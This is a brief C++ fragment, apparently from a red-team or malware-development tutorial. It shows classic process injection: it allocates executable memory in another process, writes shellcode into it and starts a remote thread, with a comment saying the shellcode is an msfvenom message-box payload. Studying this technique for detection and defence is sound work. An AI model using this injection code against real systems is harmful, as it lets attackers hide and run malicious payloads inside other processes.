...
// msfvenom x64 msgbox shellcode
    ...
    remotebuffer = VirtualAllocEx(prochandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(prochandle, remotebuffer, shellcode, sizeof shellcode, NULL);
    threadhandle = CreateRemoteThread(prochandle, NULL, 0, LPTHREAD_START_ROUTINE(remotebuffer), NULL, 0, NULL);
